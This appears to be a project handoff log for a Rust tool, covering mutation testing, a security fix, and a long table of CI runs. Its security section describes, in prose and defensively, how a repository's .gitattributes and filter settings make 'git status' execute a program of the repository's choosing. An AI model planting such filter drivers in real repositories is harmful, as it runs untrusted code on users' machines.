used a fixture under `target/` — which is inside the SURE checkout and therefore
inside a working tree.** It exercised the "inside somebody else's repository"
branch and never the "no repository" one, and it passed. Nothing about its
assertion was false, and nothing said the fixture could not reach its case.

The mutation *"a directory in no repository is refused rather than read by
content"* was **MISSED by every test in the suite**, which is what surfaced it.
Fixed by `Fixture::outside_any_repository` (the system temp directory) plus a
`git_prefix()` helper that asserts the premise **with Git directly** — a premise
checked with the code under test is not a premise. The same premise assertion was
added to the "inside somebody else's repository" test, where it immediately
caught a second thing: the comparison was against `Some("inner/")` while Git
prints a trailing newline, so the reading was wrong and the assertion was right.

### Two properties that no test holds, recorded as gap 8 rather than left looking covered

Same treatment `--includes` got in the previous session, for the same reason.

- **The sort before hashing.** Removing it passes every test. The digest is a
  value, and the sort's whole purpose is to make it independent of the order the
  walk happened to produce — one run sees one filesystem's order and no other, so
  there is nothing a test could compare two of. The Git kind's sort has the same
  status, which is why `mutate6.py` does not mutate it either.
- **The domain tag.** Setting it to the Git kind's also passes every behavioural
  test, because the two digests cannot collide even with one tag — the Git kind
  opens with `head` and the content kind with `manifest`. So the tag is belt and
  braces over the field structure rather than the thing that keeps the kinds
  apart, and an earlier comment in this task said the opposite until the mutation
  showed it. What pins it now is a constant assertion, and what that assertion
  protects is the *decision*: the tag is part of the format of every fingerprint
  already stored.

### `P2-T003` mutation results

`target/tmp/mutate7.py` (git-ignored, 16 mutations): **all 16 caught**, and the
two link mutations reported `BLIND` on Windows rather than omitted. It found
three boundary-weak tests as well, which are now pinned from both sides: the file
limit asserts three files under limits of three *and* two, and the byte budget is
finally shown to be spent by the whole manifest rather than by each file.

It also found that **`read.rs` is reached through the Git kind** — the walk inside
a nested directory is only ever reached there, because a nested checkout Git
refuses to descend into is one untracked *path*. Two mutations were reported
MISSED until the script was made to run `--test fingerprint_git` as well, and
that is why its test command names both binaries.

## What the filter hardening added, and the two claims it corrected

**A security review of `9f13f0d` — run automatically, and arriving as a
background notification rather than from a person — found that fingerprinting a
project could still execute a program the repository chose. It was right.** The
commit `5705444` is the fix. No user input was involved and none is implied.

The review's one-line finding (`subprocess-rce-via-untrusted-git-config`,
"incomplete fix") was checked rather than taken on trust, and the check is what
made the fix designable: a marker program behind a tracked `.gitattributes` plus
a `filter.<n>.clean` setting in the repository's own configuration is executed
by a plain `git status` **with nothing modified**. The control that proves the
fixture really fires is what makes the negative assertion mean anything, and the
first version of the probe was wrong in exactly that way — it reported `RAN` for
every route because `git add` inside its own setup had left the marker behind.
All of that is in `target/tmp/filter_probe.sh`'s header, which is kept out of the
repository but not deleted, because the next reader will want it.

What closes it, and why refusing is the only option rather than the cautious
one, is in `docs/architecture/FINGERPRINTING.md` under "A repository is not
allowed to make Git run a program". The short form:

- **It cannot be turned off.** No Git flag disables in-tree `.gitattributes`
  (`git help --config` lists only the global `core.attributesFile`), and the
  driver name is not known until Git has read the project, so there is no fixed
  `-c` to pass.
- **Overriding it would be wrong, not just hard.** With the filter off, Git
  compares a file's raw bytes against a blob that was written *through* the
  filter and calls every such file modified. A wrong fingerprint marks stale
  evidence current, which is the failure this product exists to prevent.
- So the repository is refused, with `FingerprintError::RepositoryRunsPrograms`
  naming the settings it found. `crates/sure-core/src/fingerprint/error.rs` is
  where the message lives; it says what happened, why SURE stopped, and what to
  do.

The check is one extra invocation — `git config --list --includes -z` with
`GIT_CONFIG_NOSYSTEM=1` and `GIT_CONFIG_GLOBAL=<root>/.git/config/sure-no-global-configuration`
— placed **after** `rev-parse` (measured not to run a filter) and **before**
`status` (measured to run one). The suppressed global path is under
`.git/config`, which is a file in every repository Git makes, including linked
worktrees and submodules, so nothing can exist there and no project can add
settings to the answer about itself.

### Two claims this work made and then corrected, both by measurement

This is the part worth carrying forward, because both were wrong in the same
direction — a confident sentence that a test appeared to confirm.

1. **`--includes` is not load-bearing.** The source comment, the document and a
   test all said the flag was what made an included filter visible, reasoning
   from "includes are off as soon as a scope is named". That is true of
   `--local` and **false of this invocation**: `git config --list` with no scope
   named already follows includes, so the flag changes no answer. It was caught
   by writing a mutation for it and seeing that its removal failed *only* the
   test that pins the flags and no behavioural test. The flag is kept — stating
   the property beats inheriting it from a default — and the false claim is
   corrected in all three places.
2. **The include-path test did not test what its name said.** It was written to
   cover `--includes`, and it covers a real property instead: the check does not
   care whether a setting arrived through `include.path` or the repository's own
   file. Both the test comment and the document now say so.

The lesson is the one this repository keeps relearning: a test that passes is
not evidence that the thing it names is being tested. Only removing the thing
and watching the test fail is.

### A boundary that was measured, and is left open on purpose

**A repository can still reach a filter the *machine* defines**, by naming the
driver in `.gitattributes` without defining it. Measured with
`target/tmp/boundary_probe.sh`: on this machine both
`C:/Program Files/Git/etc/gitconfig` and `~/.gitconfig` carry
`filter.lfs.{clean,smudge,process}` and `git-lfs` is on the `PATH`, so a plain
`git status` on such a repository runs `git-lfs`.

It is left open, and the reason is the line `EXECUTION_SAFETY.md` actually
draws: the project **cannot choose the program**, only ask for one the user
already installed. What runs is not project-controlled code. That is a
defensible boundary and it is not the same thing as the defect the review named,
which let a repository choose the program.

**This needs an owner decision and no task covers it.** Closing it would mean
reading driver names out of the project's attributes (`.gitattributes`,
`$GIT_DIR/info/attributes`) and refusing when any resolves in any scope — real
work with a real cost, namely a refusal for every repository that legitimately
uses Git LFS. It is documented in full in `FINGERPRINTING.md` and raised here
rather than folded into a security fix for something else. `P2-T011` is **not**
this; that id is the intent model. No id was invented.

### Gates for `5705444`

`cargo fmt --all -- --check` clean; `cargo clippy --workspace --all-targets --
-D warnings` clean; `cargo test --workspace` green across 31 test binaries
(`fingerprint_git` went 40 → 43, `fingerprint::git` unit tests 24); `node
scripts/taskctl.mjs validate` = state OK: 166 tasks; `scripts/Preflight-Windows.ps1`
= passed. **34 mutations in `target/tmp/mutate6.py`, 34 fired** — 8 of them new
here, and the two that matter most are "the check runs after the status instead
of before it", caught only by the assertion that the marker does **not** exist,
and "the suppressed global path is one a project could create".

**On CI, at run `34843216260`, all five jobs are green.** Two things about that
run are worth more than the colour:

- The eight new refusal tests were read out of the log **by name**, on all three
  `rust` jobs. The two scope tests ran twice each on Windows, Linux and macOS.
- **Each of those tests asserts its own control** — that a raw `git status` on
  the fixture *does* create the marker — so the passing "SURE did not run it"
  assertion is meaningful on Unix and not only on Windows. This is the rare case
  where a security property is verified by execution on all three platforms
  rather than argued from one.

## Continuous integration, and why this section exists

**Every `ci` run on this branch failed until `c735a2f` — including the runs for
both accepted tasks — and no handoff said so.** Every handoff up to `P2-T002`
recorded the local gate set — fmt, clippy, the workspace suite,
`validate-bootstrap` — as "the gates", all of it green, and never opened a run.
Three of the five jobs were failing the whole time.

| Run | Commit | Result |
| --- | --- | --- |
| 34822860271 | `0c85181` — **the bootstrap commit, and the first run this branch ever had** | **failure: `shellcheck-secondary`**, exit 1, `scripts/preflight.sh` line 2, **SC1128**: "The shebang must be on the first line. Delete blanks and move comments." The other four jobs green. The whole workspace held **2 tests**: **9** result lines on each of Windows, macOS and Ubuntu, **seven of them `0 passed`** and two carrying one test apiece. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` **This row was missing until `P4-T003`'s acceptance, and the run was named nowhere in this file** — so the paragraph below, which says every `ci` run on this branch failed until `c735a2f`, was true of a run the table did not contain and no reader could check. Read out of the downloaded log |
| 34835901161 | `07e20be` — **the `P2-T001` record commit** | **failure: three jobs.** `shellcheck-secondary` — the same SC1128 in `scripts/preflight.sh`, unfixed. `rust (macos-latest)` — `cargo clippy --workspace --all-targets -- -D warnings` exit 101 on **two errors in `crates/sure-core/tests/scan_project.rs`**: `unused import: std::ffi::OsString` at line 32, and `function name_that_is_not_valid_unicode is never used` at line 281 — a helper that is dead code to every platform but Windows, which is the class of defect a Windows-primary machine cannot see. `rust (ubuntu-latest)` — `cargo test --workspace` exit 101 on **exactly one failing test**, `config::tests::a_path_that_leaves_the_project_is_refused`, panicking at `crates/sure-core/src/config/mod.rs:870` with "this configuration should not be accepted": **239 passed, 1 failed**. Windows green, **563 passed**, 1 ignored, over **30 result lines** against Ubuntu's **3** — the workspace run there stopped at the failing `--lib` binary rather than continuing, which is the failure the `P3-T003` acceptance later closed by putting `--no-fail-fast` into CI. macOS has **no result line at all**, because clippy failed before any test ran. **This row was missing until `P4-T003`'s acceptance, and the run was named nowhere in this file** |
| 34838737260 | `3fea3fa` — **the `P2-T002` acceptance commit** | failure: `rust (ubuntu-latest)`, `rust (macos-latest)`, `shellcheck-secondary` |
| 34839005174 | `58b3793` — first attempt at a fix | failure: the same three jobs |
| 34839532984 | `c735a2f` — after reading that run | **all five green.** First green run on this branch, and the first that executes any `#[cfg(unix)]` fingerprint test |
| 34840217454 | `9f13f0d` | **all five green**, including the new pipe test on both Unix jobs |
| 34840594638 | `91e8838` — the CI-outage record | all five green. **These two rows were the wrong way round until `P4-T003`'s acceptance**: `34840594638` is the smaller id and `git merge-base --is-ancestor` puts `91e8838` first, so the table's oldest-first order was broken here and nowhere else — `target/tmp/runindex.py` checks that too |
| 34843216260 | `5705444` — the filter hardening | **all five green.** The eight new refusal tests were read out of the log **by name on all three `rust` jobs**, not inferred from the job colours; `a_program_reached_through_an_included_file_is_refused_too` and `a_program_in_the_worktree_configuration_is_refused_too` ran twice each on Windows, Linux and macOS |
| 34843455162 | `9850a9a` — the filter-hardening record | all five green |
| 34845282962 | `7ce90bf` + `1cda5a0` — **the `P2-T003` acceptance** | **all five green.** Detail below, because the colour is the least of it |
| 34845645097 | `c7c0824` — the `P2-T003` record | all five green |
| 34850549120 | `0a577ca` + `68e51d8` + `1ec5bee` — **the `P2-T004` acceptance** | **failure: `rust (ubuntu-latest)` and `rust (macos-latest)`.** One test, `discover::read::tests::a_path_a_manifest_named_cannot_leave_the_project`. Detail below |
| 34851008124 | `650852e` — the fix for that | **all five green**, and the test that failed was read out of all three `rust` logs **by name**. **736 / 738 / 739** passed, 0 failed, 1 ignored, **33** result lines = **23 parents + 10 children** on each — measured in this session, because the original row gave no figures and `df597a3`'s row needs a baseline |
| 34851513113 | `df597a3` — **the `P2-T004` record commit** | **all five green**, and **736 / 738 / 739** with 0 failed, 1 ignored, **33** result lines = **23 parents + 10 children** on each — the row above's figures to the test, unchanged, which is what a commit that records the row above should produce. **This row was missing until `P4-T003`'s acceptance, and the run was named nowhere in this file** |
| 34854388756 | `e10f620` — **the `P2-T005` implementation** | **all five green.** Windows **786** / macOS **788** / Ubuntu **789** passed, 0 failed, each over 34 result lines. Detail below, because **Windows agreeing with the local run exactly is the fact worth having** |
| 34855496424 | `37a848a` — **the `P2-T005` acceptance** | **all five green, and the counts are the implementation's to the test**: Windows **786** / macOS **788** / Ubuntu **789**, 0 failed, 34 result lines = 24 parents + 10 children on each. A documentation-only commit changing no number is the useful reading — it says the record was added without touching what it records |
| 34855790124 | `cad9592` — **the record of that acceptance** | **all five green, and the same three figures a third time**: Windows **786** / macOS **788** / Ubuntu **789**, 0 failed, 34 result lines = 24 parents + 10 children on each. Read from the log rather than from the job colours: `gh run view` alone gives the conclusion, and the conclusion is the least of what a run says |
| 34858555861 | `9c931d0` — **the `P2-T006` implementation** | **all five green.** Windows **840** / macOS **842** / Ubuntu **843** passed, 0 failed, 1 ignored, each over **35** result lines = **25** parents + 10 children. The parent count went 24 → 25 because `discover_rust` is a new test binary; the child count is unchanged. **Windows agrees with the local Windows run exactly**, and all 54 new test names were read out of all three `rust` logs by name. Detail below |
| 34861419193 | `9c6e08d` — **the `P2-T006` tests commit** | **all five green.** Windows **849** / macOS **851** / Ubuntu **852** passed, 0 failed, 1 ignored, each over **35** result lines = **25** parents + 10 children. **+9 on every platform against the row above, which is the nine `pattern.rs` tests and nothing else**, and **Windows again equals the local Windows run exactly**. All nine were read out of all three logs **by name**, detail below |
| 34861757296 | `1638414` — the `P2-T006` run record | **all five green**, and **849 / 851 / 852 with 0 failed, 1 ignored** — identical to the row above. That is the reading a documentation-only commit is for: the record was added without changing what it records |
| 34862091063 | `48d1057` — **the `P2-T006` acceptance** | **all five green**, and **849 / 851 / 852 again**, unchanged. The acceptance touches only `progress/state.json` and this file, so the counts are the implementation's to the test and the three green runs together say the task's evidence survived its own recording |
| 34862387972 | `809c738` — the acceptance run's record | all five green. **This is where the chain stops**, and the stopping rule is stated rather than left implicit: every commit's run is read, but the run of the commit that *records* runs is read and reported in the session rather than enshrined in a further commit. Otherwise "read the run" never terminates. The rule was not written down before `P2-T006` and the last two tasks each ended with an unrecorded final run |
| 34862642588 | `b8ecd50` — **the `P2-T006` record commit** | **all five green**, and **849 / 851 / 852** with 0 failed, 1 ignored, **35** result lines = **25 parents + 10 children** on each — identical to the row above. **This row was missing until `P3-T003`'s acceptance and is added here after downloading the logs**: the commit it belongs to records the last run of its chain in its own subject, and the row for that run was never written |
| 34864498113 | `586d3a3` — **the `P2-T007` implementation** | **all five green.** Windows **871** / macOS **873** / Ubuntu **874** passed, 0 failed, 1 ignored, each over **36** result lines = **26** parents + 10 children. The parent count went 25 → 26 because `components_graph` is a new test binary. **Windows agrees with the local Windows run exactly**, all 22 new test names were read out of all three `rust` logs **by name**, and the multisets were compared against the run before this one. Detail below |
| 34865169857 | `435181f` — the `P2-T007` run record | **all five green**, and **871 / 873 / 874 with 0 failed, 1 ignored, 26 parents** — the implementation's figures to the test, unchanged. A commit that adds only prose to this file changing no count is the reading a record commit is for |
| 34865317166 | `0907acf` — **the `P2-T007` acceptance** | **all five green**, and **871 / 873 / 874 again**, unchanged, `26` parents each. The acceptance touches only `progress/state.json` and this file, so the implementation's evidence survived its own recording. **This run is the end of the `P2-T007` chain and is reported in the session rather than committed** — see the rule stated at the top of this file |
| 34865716315 | `906bfb0` — **the `P2-T007` record commit, which edits only this file** | **failure: `rust (ubuntu-latest)`.** The other four jobs green, including `rust (macos-latest)` and `rust (windows-latest)` on **the same commit**. Two tests failed in `sure-core --test store_concurrency`. Detail below — this is the first red run since `c735a2f` and the first ever seen on a documentation-only commit |
| 34866795192 | `0f7c854` — **the fix for that run** | **all five green, including `rust (ubuntu-latest)`, the job that failed.** Windows **877** / macOS **879** / Ubuntu **880** passed, 0 failed, 1 ignored, each over **36** result lines = **26** parents + 10 children. **Windows equals the local Windows run exactly**, and the multiset comparison moved **one position on each of the three platforms** — the lib target, `401→407` on Windows and `398→404` on both Unix jobs. Detail below |
| 34867202057 | `3be88f1` — **the record of that fix's run** | **all five green**, and **877 / 879 / 880** with 0 failed, 1 ignored, **36** result lines = **26 parents + 10 children** on each — the row above's figures to the test, unchanged. **This row was also missing until `P3-T003`'s acceptance** |
| 34869888350 | `4746c48` — **the `P2-T010` implementation** | **all five green.** Windows **907** / macOS **909** / Ubuntu **910** passed, 0 failed, 1 ignored, each over **37** result lines = **27** parents + 10 children. The parent count went 26 → 27 because `project_intent_ingest` is a new test binary. **Windows agrees with the local Windows run exactly**, and the +30 is attributed **by binary name** rather than by total. Detail below |
| 34870783994 | `63278c0` — **the `P2-T010` acceptance** | **all five green**, and **907 / 909 / 910** with 0 failed, 1 ignored, **37** result lines = **27 parents + 10 children** on each — the implementation's three figures to the test, unchanged |
| 34873225889 | `d5261a6` — **the `P2-T012` implementation** | **all five green.** Windows **920** / macOS **922** / Ubuntu **923** passed, 0 failed, 1 ignored, each over **38** result lines = **28** parents + 10 children. The parent count went 27 → 28 because `support_levels` is a new test binary. **Windows agrees with the local Windows run exactly**, the +13 is attributed **by binary name** to four binaries, and all 13 new tests were read out of all three `rust` logs by name. Detail below — including a **positional multiset diff that was run, produced four well-formed rows, and was wrong** |
| 34874786404 | `481066f` — **the `P2-T012` acceptance** | **all five green**, and **920 / 922 / 923** with 0 failed, 1 ignored, **38** result lines = **28 parents + 10 children** on each, unchanged from the row above |
| 34877928915 | `ec8456d` — **the `P2-T008` implementation** | **all five green.** Windows **963** / macOS **965** / Ubuntu **966** passed, 0 failed, 1 ignored, each over **39** result lines = **29 parents + 10 children**. The parent count went 28 → 29 because `config_references` is a new test binary. **Windows agrees with the local Windows run exactly**, the +13 is attributed **by binary name**, and all 25 + 18 new test names were read out of all three `rust` logs **by name**. Detail below |
| 34878508861 | `cd530f6` — **the `P2-T008` acceptance** | **all five green**, and **963 / 965 / 966** with 0 failed, 1 ignored, **39** result lines = **29 parents + 10 children** — the implementation's figures to the test, unchanged |
| 34917710402 | `b644462` — **the `P2-T009` implementation** | **all five green.** Windows **1019** / macOS **1021** / Ubuntu **1022** passed, 0 failed, 1 ignored, each over **40** result lines = **30 parents + 10 children**. The parent count went 29 → 30 because `document_commands` is a new test binary. **Windows agrees with the local Windows run exactly**, and all 36 `documents::tests::*` names and all 20 `document_commands` names were read out of all three `rust` logs **by name**. Detail below |
| 34918036410 | `cf7675d` — **the `P2-T009` acceptance** | **all five green**, and **1019 / 1021 / 1022** with 0 failed, 1 ignored, **40** result lines = **30 parents + 10 children** — unchanged from the row above |
| 34919714838 | `73da9a6` — **the `P2-T011` implementation** | **all five green.** Windows **1040** / macOS **1042** / Ubuntu **1043** passed, 0 failed, 1 ignored, each over **41** result lines = **31 parents + 10 children**. The parent count went 30 → 31 because `intent_sources` is the new 27th named test binary. **Windows agrees with the local Windows run exactly**, the +21 is attributed **by binary name**, and all 14 `intent_model::tests::*` names and all 7 `intent_sources` names were read out of all three `rust` logs **by name**. Detail below |
| 34921018452 | `408b821` — **the `P2-T011` acceptance** | **all five green**, and **1040 / 1042 / 1043** with 0 failed, 1 ignored, **41** result lines = **31 parents + 10 children** — the implementation's three figures to the test, unchanged. **This row was missing until `P3-T002`'s acceptance** and is added here after downloading the logs rather than copied from the row above |
| 34924525793 | `819d499` — **the `P3-T001` implementation** | **all five green.** Windows **1072** / macOS **1071** / Ubuntu **1072** passed, 0 failed, **7 ignored**, each over **43** result lines = **33 parents + 10 children**. The parent count went 31 → 33 by exactly two, because `process_runner` and `spawn_sites` are two new test binaries. **Windows agrees with the local Windows run exactly**, and all 37 new test names were read out of all three `rust` logs **by name** — 37 of 37 on Windows, 34 of 37 on macOS and Ubuntu, the three absent ones being exactly the `#[cfg(windows)]` tests. Detail below |
| 34925508727 | `8955a69` — **the `P3-T001` acceptance** | **all five green**, and **1072 / 1071 / 1072** with 0 failed, 7 ignored, **43** result lines = **33 parents + 10 children** — unchanged from the row above, which is what a documentation-only commit should read as. **This run was read in the session that took the acceptance and is reported here rather than committed at the time**, which is the chain rule stated at the top of this file. **This row was also missing until `P3-T002`'s acceptance** |
| 34927065374 | `fd878e6` — **the `P3-T002` implementation** | **all five green.** Windows **1077** / macOS **1076** / Ubuntu **1077** passed, 0 failed, **9 ignored**, **33 parents + 10 children** — but Ubuntu reports them over **42 physical result lines**, because two child lines are spliced into one. Counted by occurrence rather than by line, Ubuntu is **identical to Windows**. The parent count moved +5 on every platform for the five new tests and no new binary; the ignored count moved +2 for the two new children, and Windows agrees with the local Windows run exactly. Detail below, because **the one apparent difference between the three jobs is a defect this branch has now recorded four times** |
| 34927892786 | `601c171` — **the `P3-T002` acceptance** | **all five green**, and **1077 / 1076 / 1077** with 0 failed, 9 ignored, **43** result lines = **33 parents + 10 children** on each — the implementation's figures to the test, unchanged. **This row was missing until `P3-T003`'s acceptance, and the logs were downloaded before it was written** |
| 34929385200 | `b0dcc69` — **the `P3-T003` implementation** | **failure: `rust (macos-latest)`.** The other four jobs green. Windows **1078** / macOS **1078** / Ubuntu **1080** passed over **43** result lines = **33 parents + 10 children** on each, 9 ignored, and **exactly one failing test**, `a_program_whose_name_is_not_valid_utf8_is_the_program_that_runs`, which is the `#[cfg(unix)]` test macOS cannot satisfy. **The failing test is not the last thing in the log**: 14 more binaries started after it and 19 of the 33 parent result lines came after it, which is the `--no-fail-fast` change doing its job on the run that needed it. Detail below |
| 34930744061 | `ea2f826` — **the `P3-T003` fix** | **all five green.** Windows **1078** / macOS **1079** / Ubuntu **1080** passed, 0 failed, 9 ignored, **43** physical lines = **43 results** = **33 parents + 10 children** on each — the splice the `fd878e6` row records did not occur. **Three different deltas, one per platform, because the three jobs compile different code: +1 on Windows, +3 on macOS, +3 on Ubuntu**, and the parent and child counts stand still on all three. Detail below. **The delta sentence that stood here until `P4-T003`'s acceptance was `+1 on Windows, +3 on macOS, +3 on Ubuntu`, and it is false under either definition of the column**: measured against the row above, both the `passed` totals (1088 / 1088 / 1090 → 1088 / 1089 / 1090) and the `parent_passed` totals (1078 / 1078 / 1080 → 1078 / 1079 / 1080) give **+0 on Windows, +1 on macOS, +0 on Ubuntu** — the one macOS test the fix repaired, and nothing else. The old sentence was also self-refuting: it called the three deltas "three different deltas" when two of the three were the same number and two were zero. It is corrected here rather than deleted, because a wrong reading that was once accepted is part of the record |
| 34931709579 | `e22118b` — **the `P3-T003` acceptance** | **all five green**, and **1088 / 1089 / 1090** with 0 failed, 9 ignored, **43** result lines = **33 parents + 10 children** on each — the row above's figures to the test, **+0 on every platform**, which is what a commit touching only `progress/` should produce. `git show --name-status e22118b` lists `progress/DECISIONS.md`, `progress/HANDOFF.md` and `progress/state.json` and nothing else, so the unchanged counts are the commit's own shape rather than a coincidence. **This row was missing until `P4-T003`'s acceptance, and the run was named nowhere in this file** |
| 34935781639 | `967c5e6` — **the `P3-T004` implementation** | **all five green.** Windows **1126** / macOS **1127** / Ubuntu **1128** passed, 0 failed, 9 ignored, **44** result lines = **44 result tuples** = **34 parents + 10 children** on each. **Windows equals this machine's own run to the test — 1126 over 44 results** — the parent count moved **33 → 34** for the new `command_safety` binary, and all **38** new test names were found by name on all three jobs. **No `P3-T004` test is platform-gated**, so the +1 and +2 are the sets accumulated since `P2-T004`. Detail below, including a third variant of the log-prefix trap |
| 34936301857 | `ea0fe6c` — **the `P3-T004` acceptance** | **all five green.** Windows **1126** / macOS **1127** / Ubuntu **1128** passed, 0 failed, 9 ignored, **44** result lines = **44 results** = **34 parents + 10 children** on each — the row above's three figures to the test, unchanged. **This row was missing until `P3-T010`'s acceptance**, when the check below was finally run and found twenty rows absent |
| 34938974624 | `c940300` — **the `P3-T005` implementation** | **all five green.** Windows **1152** / macOS **1153** / Ubuntu **1154** passed, 0 failed, 9 ignored, **44** result lines = **44 results** = **34 parents + 10 children** on each. **+26 on every platform and the parent count stands still at 34**, so the new tests landed inside existing binaries rather than adding one |
| 34940207615 | `63d5b19` — **the `P3-T005` acceptance** | **all five green**, and **1152 / 1153 / 1154** with 0 failed, 9 ignored, **34 parents + 10 children** — unchanged from the row above. **This row and the one above it were missing until `P3-T010`'s acceptance, and neither run was named anywhere in this file** |
| 34941955270 | `d58532a` — **the `P3-T006` implementation** | **all five green.** Windows **1182** / macOS **1183** / Ubuntu **1184** passed, 0 failed, 9 ignored, **44** result lines = **34 parents + 10 children**. **+30 on every platform**, parent count unchanged |
| 34942566982 | `664575b` — **the `P3-T006` acceptance** | **all five green**, and **1182 / 1183 / 1184** with 0 failed, 9 ignored, **34 parents + 10 children** — unchanged from the row above |
| 34943445326 | `6353477` — **the `P3-T007` implementation** | **all five green.** Windows **1196** / macOS **1197** / Ubuntu **1198** passed, 0 failed, 9 ignored, **44** result lines = **34 parents + 10 children**. **+14 on every platform**, parent count unchanged |
| 34943853809 | `18209d8` — **the `P3-T007` second commit** | **all five green.** Windows **1197** / macOS **1198** / Ubuntu **1199** passed, 0 failed, 9 ignored, **44** result lines = **34 parents + 10 children**. **+1 on every platform** |
| 34944133634 | `719253e` — **the `P3-T007` third commit** | **all five green.** Windows **1198** / macOS **1199** / Ubuntu **1200** passed, 0 failed, 9 ignored, **44** result lines = **34 parents + 10 children**. **+1 on every platform** |
| 34945070507 | `0f9273b` — **the `P3-T007` acceptance** | **all five green**, and **1198 / 1199 / 1200** with 0 failed, 9 ignored, **34 parents + 10 children** — unchanged from the row above |
| 34946515895 | `6ea9f46` — **the `P3-T008` implementation** | **all five green.** Windows **1219** / macOS **1220** / Ubuntu **1221** passed, 0 failed, 9 ignored, **45** result lines = **45 results** = **35 parents + 10 children**. The parent count went 34 → 35 because `container_adapter` is a new test binary, and **+21 on every platform** |
| 34949042220 | `1f403d8` — **the `P3-T008` acceptance** | **all five green**, and **1219 / 1220 / 1221** with 0 failed, 9 ignored, **35 parents + 10 children** — unchanged from the row above |
| 34949484506 | `a2d08a6` — **the `P3-T008` run record** | **all five green**, and **1219 / 1220 / 1221** with 0 failed, 9 ignored, **35 parents + 10 children** — the row above's figures to the test for the third time in this chain |
| 34952200942 | `6911e2a` — **the `P3-T009` implementation** | **failure: `rust (macos-latest)`.** The other four jobs green, Windows **1227** and Ubuntu **1229** passed with 0 failed. macOS **1227 passed, 1 failed**, and **exactly one failing test**: `a_service_that_ends_by_itself_reports_the_code_it_ended_with_and_where_it_ran`. **46** result lines = **36 parents + 10 children** on each, **11 ignored** — the ignored count moved 9 → 11 for two new children, and the parent count 35 → 36 for the new `service_supervisor` binary. Detail below |
| 34952509429 | `12b81bc` — **the fix for that** | **all five green, including `rust (macos-latest)`, the job that failed.** Windows **1227** / macOS **1228** / Ubuntu **1229** passed, 0 failed, 11 ignored, **46** result lines = **36 parents + 10 children**. **+1 on macOS alone**, which is the one test the failing assertion lived in — Windows and Ubuntu did not move at all |
| 34953593684 | `a6bc8df` — **the `P3-T009` acceptance** | **all five green**, and **1227 / 1228 / 1229** with 0 failed, 11 ignored, **36 parents + 10 children** — unchanged from the row above |
| 34953980527 | `af2cd75` — **the `P3-T009` run record** | **all five green**, and **1227 / 1228 / 1229** with 0 failed, 11 ignored, **36 parents + 10 children** — unchanged again |
| 34954317400 | `a0f101d` — **the `P3-T009` run record** | **all five green**, and **1227 / 1228 / 1229** with 0 failed, 11 ignored, **36 parents + 10 children** — a third consecutive identical reading, which is what a progress-only commit should produce |
| 34955834313 | `9ad32e6`, carrying `43c4a61` — **the `P3-T010` implementation and its tests** | **all five green.** Windows **1250** / macOS **1251** / Ubuntu **1252** passed, 0 failed, 11 ignored, **47** result lines = **37 parents + 10 children**. The parent count went 36 → 37 for the new `probe_local_service` binary and **+23 on every platform**. **`43c4a61` has no run of its own** — the two commits were pushed together, so this one run is both. Detail above, including the `+23 −0` whose `−0` was predicted from the commit before the run was read |
| 34956776646 | `0eb1ac3` — **a doc-comment correction** | **failure: `rust (windows-latest)`.** The other four jobs green, macOS **1251** and Ubuntu **1252** passed with 0 failed. Windows **1249 passed, 1 failed** — `a_port_with_nothing_behind_it_is_refused_rather_than_unreachable` — over the same **47** result lines = **37 parents + 10 children**. **A commit that changes one doc comment and no executable line, failing on the platform it was written on**, which is what made this a product defect rather than a test flake. Detail above |
| 34957515713 | `01fc2a7` — **the self-connect fix** | **all five green, including `rust (windows-latest)`, the job that failed.** Windows **1251** / macOS **1252** / Ubuntu **1253** passed, 0 failed, 11 ignored, **47** result lines = **37 parents + 10 children**. **+1 on every platform and the one failing test now passes**: the total on Windows went 1250 → 1251, which is the new unit test and nothing else, while the integration test moved from the failed column to the passed one. **No new binary, so the parent count stands still** |
| 34958280318 | `706d44f` — **the `P3-T010` acceptance** | **all five green**, and **1251 / 1252 / 1253** with 0 failed, 11 ignored, **47** result lines = **37 parents + 10 children** — **unchanged from the row above in every column**, which is what a progress-and-prose-only commit should produce. **This row was missing**: the acceptance was committed and its run read in the session that produced it, and no commit since had added the row, so `gh run list` showed a run the table did not |
| 34959719084 | `be02100` — **the `P3-T011` implementation** | **all five green.** Windows **1277** / macOS **1278** / Ubuntu **1279** passed, 0 failed, 11 ignored, **48** result lines = **38 parents + 10 children**. The parent count went 37 → 38 for the new `browser_probe` binary and **+26 on every platform**, which is exactly the 19 `browser::tests::*` unit tests and 7 integration tests this commit adds. Namesets **`+26 −0`** against `34958280318` with the identical added set on all three platforms — **nothing was renamed and nothing was dropped**, which is the half a count cannot show. `bootstrap-validate-windows` prints `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`. Detail above |
| 34960572838 | `8277a48` — **the `P3-T011` acceptance** | **all five green**, and **1277 / 1278 / 1279** with 0 failed, 11 ignored, **48** result lines = **38 parents + 10 children** on each — the row above's figures to the test, **+0 on every platform**, on a commit that touches only `progress/`. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` **This row was missing until `P4-T003`'s acceptance, and the run was named nowhere in this file** |
| 34963032089 | `97f0707` — **the `P4-T001` implementation** | **all five green.** Windows **1306** / macOS **1307** / Ubuntu **1308** passed, 0 failed, 11 ignored, **49** result lines = **39 parents + 10 children**. The parent count went 38 → 39 for the new `check_schedule` binary and **+29 on every platform**, which is exactly the 20 `schedule::tests::*` unit tests and 9 integration tests this commit adds. Namesets **`+29 −0`** against `34959719084` with the identical added set on all three platforms. `bootstrap-validate-windows` prints `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`. Detail above |
| 34964462368 | `53599d2` — **the `P4-T001` acceptance** | **all five green**, and **1306 / 1307 / 1308** with 0 failed, 11 ignored, **49** result lines = **39 parents + 10 children** on each — the row above's figures to the test, **+0 on every platform** |
| 34969139607 | `0bf09c2` — **the `P4-T002` implementation** | **all five green.** Windows **1334** / macOS **1335** / Ubuntu **1336** passed, 0 failed, 11 ignored, **50** result lines = **40 parents + 10 children**. The parent count moved **39 → 40** for the new `node_checks` binary and **+28 on every platform** against `34964462368`. Detail above, where the Windows name table decomposes that `+28` into `+18` `sure_core`, `+9` new `node_checks`, `+1` `check_schedule` and `+0` on the other thirty-six names |
| 34970543344 | `424b213` — **the `P4-T002` acceptance** | **all five green**, and **1334 / 1335 / 1336** with 0 failed, 11 ignored, **50** result lines = **40 parents + 10 children** on each — the row above's figures to the test, **+0 on every platform** |
